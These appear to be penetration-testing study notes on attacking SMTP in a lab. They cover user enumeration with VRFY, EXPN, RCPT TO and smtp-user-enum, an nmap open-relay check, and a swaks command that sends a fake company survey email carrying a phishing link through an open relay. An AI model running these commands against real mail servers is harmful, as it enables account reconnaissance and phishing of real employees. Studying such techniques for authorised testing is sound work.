#SMTP
### VRFY command 
Connect to SMTP over telnet and use VRFY to confirm a user exists
```shell
VRFY root

252 2.0.0 root
```

### EXPN command 

Can Verify a user exists off a list. 
```shell
EXPN support-team

250 2.0.0 carol@inlanefreight.htb
250 2.1.5 elisa@inlanefreight.htb
```

### RCPT TO command 

Identifies the recipient of the email message 
Can repeat if multiple users 
```shell

RCPT TO:julio

550 5.1.1 julio... User unknown
```

### User command 

[smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
```shell
smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
```

## Open Relay Attack

Allows unauthenticated email relay 
Check:
```shell
 nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
```
```shell
swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
```
